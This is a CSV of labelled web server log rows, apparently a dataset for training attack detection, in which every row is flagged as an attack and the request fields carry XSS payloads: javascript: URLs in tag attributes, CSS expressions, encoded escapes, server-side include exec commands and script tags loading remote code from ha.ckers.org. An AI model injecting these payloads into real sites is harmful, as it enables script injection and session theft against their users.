"","ip","date","hour","minute","seconds","zone","request1","request2","status","respsize","url","computer","attaque"
"420","192.108.116.88","18/Dec/2017","16","36","52","+0000","POST ","datalab HTTP/1.1/NA/datalab <FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"421","192.108.116.88","18/Dec/2017","16","38","54","+0000","POST ","datalab HTTP/1.1/NA/datalab <FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"422","192.108.116.88","18/Dec/2017","16","39","18","+0000","GET "," HTTP/1.1/NA/datalab <TABLE BACKGROUND=""javascript:alert('XSS')""> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 18",1
"423","192.108.116.88","18/Dec/2017","16","39","20","+0000","GET ","css/index.css HTTP/1.1/datalab <TABLE BACKGROUND=""javascript:alert('XSS')""> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 14",1
"424","192.108.116.88","18/Dec/2017","16","39","20","+0000","GET ","img/logo.png HTTP/1.1/datalab <TABLE BACKGROUND=""javascript:alert('XSS')""> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 317",1
"425","192.108.116.88","18/Dec/2017","16","41","21","+0000","POST ","datalab HTTP/1.1/NA/datalab <TABLE BACKGROUND=""javascript:alert('XSS')""> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"426","192.108.116.88","18/Dec/2017","16","43","22","+0000","POST ","datalab HTTP/1.1/NA/datalab <TABLE BACKGROUND=""javascript:alert('XSS')""> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"427","192.108.116.88","18/Dec/2017","16","43","41","+0000","GET "," HTTP/1.1/NA/datalab <TABLE><TD BACKGROUND=""javascript:alert('XSS')""> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 0",1
"428","192.108.116.88","18/Dec/2017","16","43","42","+0000","GET ","css/index.css HTTP/1.1/datalab <TABLE><TD BACKGROUND=""javascript:alert('XSS')""> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1",1
"429","192.108.116.88","18/Dec/2017","16","43","43","+0000","GET ","img/logo.png HTTP/1.1/datalab <TABLE><TD BACKGROUND=""javascript:alert('XSS')""> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1",1
"430","192.108.116.88","18/Dec/2017","16","45","42","+0000","POST ","datalab HTTP/1.1/NA/datalab <TABLE><TD BACKGROUND=""javascript:alert('XSS')""> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"431","192.108.116.88","18/Dec/2017","16","47","44","+0000","POST ","datalab HTTP/1.1/NA/datalab <TABLE><TD BACKGROUND=""javascript:alert('XSS')""> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"432","192.108.116.88","18/Dec/2017","16","48","01","+0000","GET "," HTTP/1.1/NA/datalab <DIV STYLE=""background-image: url(javascript:alert('XSS'))""> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1",1
"433","192.108.116.88","18/Dec/2017","16","48","01","+0000","GET ","css/index.css HTTP/1.1/datalab <DIV STYLE=""background-image: url(javascript:alert('XSS'))""> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1",1
"434","192.108.116.88","18/Dec/2017","16","48","01","+0000","GET ","img/logo.png HTTP/1.1/datalab <DIV STYLE=""background-image: url(javascript:alert('XSS'))""> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1",1
"435","192.108.116.88","18/Dec/2017","16","50","01","+0000","POST ","datalab HTTP/1.1/NA/datalab <DIV STYLE=""background-image: url(javascript:alert('XSS'))""> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"436","192.108.116.88","18/Dec/2017","16","52","02","+0000","POST ","datalab HTTP/1.1/NA/datalab <DIV STYLE=""background-image: url(javascript:alert('XSS'))""> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"437","192.108.116.88","18/Dec/2017","16","52","19","+0000","GET "," HTTP/1.1/NA/datalab <DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029""> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 546",1
"438","192.108.116.88","18/Dec/2017","16","52","29","+0000","GET ","css/index.css HTTP/1.1/datalab <DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029""> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1832",1
"439","192.108.116.88","18/Dec/2017","16","52","29","+0000","GET ","img/logo.png HTTP/1.1/datalab <DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029""> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 7689",1
"440","192.108.116.88","18/Dec/2017","16","54","22","+0000","POST ","datalab HTTP/1.1/NA/datalab <DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029""> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"441","192.108.116.88","18/Dec/2017","16","56","25","+0000","POST ","datalab HTTP/1.1/NA/datalab <DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029""> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"442","192.108.116.88","18/Dec/2017","16","56","48","+0000","GET "," HTTP/1.1/NA/datalab <DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))""> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 2",1
"443","192.108.116.88","18/Dec/2017","16","56","49","+0000","GET ","css/index.css HTTP/1.1/datalab <DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))""> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 10",1
"444","192.108.116.88","18/Dec/2017","16","56","51","+0000","GET ","img/logo.png HTTP/1.1/datalab <DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))""> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 6",1
"445","192.108.116.88","18/Dec/2017","16","58","49","+0000","POST ","datalab HTTP/1.1/NA/datalab <DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))""> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"446","192.108.116.88","18/Dec/2017","17","00","50","+0000","POST ","datalab HTTP/1.1/NA/datalab <DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))""> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"447","192.108.116.88","18/Dec/2017","17","01","08","+0000","GET "," HTTP/1.1/NA/datalab <DIV STYLE=""width: expression(alert('XSS'));""> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1",1
"448","192.108.116.88","18/Dec/2017","17","01","09","+0000","GET ","css/index.css HTTP/1.1/datalab <DIV STYLE=""width: expression(alert('XSS'));""> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 2",1
"449","192.108.116.88","18/Dec/2017","17","01","09","+0000","GET ","img/logo.png HTTP/1.1/datalab <DIV STYLE=""width: expression(alert('XSS'));""> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1",1
"450","192.108.116.88","18/Dec/2017","17","03","10","+0000","POST ","datalab HTTP/1.1/NA/datalab <DIV STYLE=""width: expression(alert('XSS'));""> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"451","192.108.116.88","18/Dec/2017","17","05","11","+0000","POST ","datalab HTTP/1.1/NA/datalab <DIV STYLE=""width: expression(alert('XSS'));""> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"452","192.108.116.88","18/Dec/2017","17","05","33","+0000","GET "," HTTP/1.1/NA/datalab <!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]--> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1",1
"453","192.108.116.88","18/Dec/2017","17","05","34","+0000","GET ","css/index.css HTTP/1.1/datalab <!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]--> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1",1
"454","192.108.116.88","18/Dec/2017","17","05","34","+0000","GET ","img/logo.png HTTP/1.1/datalab <!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]--> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 0",1
"455","192.108.116.88","18/Dec/2017","17","07","34","+0000","POST ","datalab HTTP/1.1/NA/datalab <!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]--> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"456","192.108.116.88","18/Dec/2017","17","15","43","+0000","GET "," HTTP/1.1/NA/datalab <!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'""--> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1",1
"457","192.108.116.88","18/Dec/2017","17","15","43","+0000","GET ","css/index.css HTTP/1.1/datalab <!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'""--> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1",1
"458","192.108.116.88","18/Dec/2017","17","15","44","+0000","GET ","img/logo.png HTTP/1.1/datalab <!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'""--> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1",1
"459","192.108.116.88","18/Dec/2017","17","17","43","+0000","POST ","datalab HTTP/1.1/NA/datalab <!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'""--> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"460","192.108.116.88","18/Dec/2017","17","19","44","+0000","POST ","datalab HTTP/1.1/NA/datalab <!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'""--> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"461","192.108.116.88","18/Dec/2017","17","20","07","+0000","GET "," HTTP/1.1/NA/datalab <? echo('<SCR)';echo('IPT>alert(""XSS"")</SCRIPT>'); ?> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1",1
"462","192.108.116.88","18/Dec/2017","17","20","08","+0000","GET ","css/index.css HTTP/1.1/datalab <? echo('<SCR)';echo('IPT>alert(""XSS"")</SCRIPT>'); ?> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1",1
"463","192.108.116.88","18/Dec/2017","17","20","08","+0000","GET ","img/logo.png HTTP/1.1/datalab <? echo('<SCR)';echo('IPT>alert(""XSS"")</SCRIPT>'); ?> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 0",1
"464","192.108.116.88","18/Dec/2017","17","22","08","+0000","POST ","datalab HTTP/1.1/NA/datalab <? echo('<SCR)';echo('IPT>alert(""XSS"")</SCRIPT>'); ?> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"465","192.108.116.88","18/Dec/2017","17","24","09","+0000","POST ","datalab HTTP/1.1/NA/datalab <? echo('<SCR)';echo('IPT>alert(""XSS"")</SCRIPT>'); ?> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"466","192.108.116.88","18/Dec/2017","17","24","25","+0000","GET "," HTTP/1.1/NA/datalab <IMG SRC=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode""> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1",1
"467","192.108.116.88","18/Dec/2017","17","24","25","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode""> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 2",1
"468","192.108.116.88","18/Dec/2017","17","24","26","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode""> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1",1
"469","192.108.116.88","18/Dec/2017","17","24","30","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode""> ",200,1073,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1763",1
"470","192.108.116.88","18/Dec/2017","17","24","32","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode""> ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1",1
"471","192.108.116.88","18/Dec/2017","17","24","32","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode""> ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 4",1
"472","192.108.116.88","18/Dec/2017","17","24","48","+0000","GET "," HTTP/1.1/NA/datalab <META HTTP-EQUIV=""Set-Cookie Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">",200,1040,NA,"MoNA",1
"473","192.108.116.88","18/Dec/2017","17","24","48","+0000","GET ","css/index.css HTTP/1.1/datalab <META HTTP-EQUIV=""Set-Cookie Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">",200,945,"http://31.14.135.81:3000/","MoNA",1
"474","192.108.116.88","18/Dec/2017","17","24","49","+0000","GET ","img/logo.png HTTP/1.1/datalab <META HTTP-EQUIV=""Set-Cookie Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">",200,34463,"http://31.14.135.81:3000/","MoNA",1
"475","192.108.116.88","18/Dec/2017","17","26","48","+0000","POST ","datalab HTTP/1.1/NA/datalab <META HTTP-EQUIV=""Set-Cookie Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">",NA,NA,"http://31.14.135.81:3000/","MoNA",1
"476","192.108.116.88","18/Dec/2017","17","28","49","+0000","POST ","datalab HTTP/1.1/NA/datalab <META HTTP-EQUIV=""Set-Cookie Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">",NA,NA,"http://31.14.135.81:3000/","MoNA",1
"477","192.108.116.88","18/Dec/2017","17","29","07","+0000","GET "," HTTP/1.1/NA/datalab <HEAD><META HTTP-EQUIV=""CONTENT-TYPE CONTENT=""text/html;",200,1040,NA,"MoNA",1
"478","192.108.116.88","18/Dec/2017","17","29","08","+0000","GET ","css/index.css HTTP/1.1/datalab <HEAD><META HTTP-EQUIV=""CONTENT-TYPE CONTENT=""text/html;",200,945,"http://31.14.135.81:3000/","MoNA",1
"479","192.108.116.88","18/Dec/2017","17","29","09","+0000","GET ","img/logo.png HTTP/1.1/datalab <HEAD><META HTTP-EQUIV=""CONTENT-TYPE CONTENT=""text/html;",200,34463,"http://31.14.135.81:3000/","MoNA",1
"480","192.108.116.88","18/Dec/2017","17","31","08","+0000","POST ","datalab HTTP/1.1/NA/datalab <HEAD><META HTTP-EQUIV=""CONTENT-TYPE CONTENT=""text/html;",NA,NA,"http://31.14.135.81:3000/","MoNA",1
"481","192.108.116.88","18/Dec/2017","17","33","11","+0000","POST ","datalab HTTP/1.1/NA/datalab <HEAD><META HTTP-EQUIV=""CONTENT-TYPE CONTENT=""text/html;",NA,NA,"http://31.14.135.81:3000/","MoNA",1
"482","192.108.116.88","18/Dec/2017","17","33","36","+0000","GET "," HTTP/1.1/NA/datalab <SCRIPT a=""> SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",200,1040,NA,"MoNA",1
"483","192.108.116.88","18/Dec/2017","17","33","37","+0000","GET ","css/index.css HTTP/1.1/datalab <SCRIPT a=""> SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",200,945,"http://31.14.135.81:3000/","MoNA",1
"484","192.108.116.88","18/Dec/2017","17","33","37","+0000","GET ","img/logo.png HTTP/1.1/datalab <SCRIPT a=""> SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",200,34463,"http://31.14.135.81:3000/","MoNA",1
"485","192.108.116.88","18/Dec/2017","17","33","40","+0000","POST ","datalab HTTP/1.1/NA/datalab <SCRIPT a=""> SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",200,1073,"http://31.14.135.81:3000/","MoNA",1
"486","192.108.116.88","18/Dec/2017","17","33","40","+0000","GET ","css/index.css HTTP/1.1/datalab <SCRIPT a=""> SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",304,NA,"http://31.14.135.81:3000/","MoNA",1
"487","192.108.116.88","18/Dec/2017","17","33","40","+0000","GET ","img/logo.png HTTP/1.1/datalab <SCRIPT a=""> SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",304,NA,"http://31.14.135.81:3000/","MoNA",1
"488","192.108.116.88","18/Dec/2017","17","33","57","+0000","GET "," HTTP/1.1/NA/datalab <SCRIPT =""> SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",200,1040,NA,"MoNA",1
"489","192.108.116.88","18/Dec/2017","17","33","57","+0000","GET ","css/index.css HTTP/1.1/datalab <SCRIPT =""> SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",200,945,"http://31.14.135.81:3000/","MoNA",1
"490","192.108.116.88","18/Dec/2017","17","33","57","+0000","GET ","img/logo.png HTTP/1.1/datalab <SCRIPT =""> SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",200,34463,"http://31.14.135.81:3000/","MoNA",1
"491","192.108.116.88","18/Dec/2017","17","33","58","+0000","POST ","datalab HTTP/1.1/NA/datalab <SCRIPT =""> SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",200,1073,"http://31.14.135.81:3000/","MoNA",1
"492","192.108.116.88","18/Dec/2017","17","33","59","+0000","GET ","css/index.css HTTP/1.1/datalab <SCRIPT =""> SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",304,NA,"http://31.14.135.81:3000/","MoNA",1
"493","192.108.116.88","18/Dec/2017","17","33","59","+0000","GET ","img/logo.png HTTP/1.1/datalab <SCRIPT =""> SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",304,NA,"http://31.14.135.81:3000/","MoNA",1
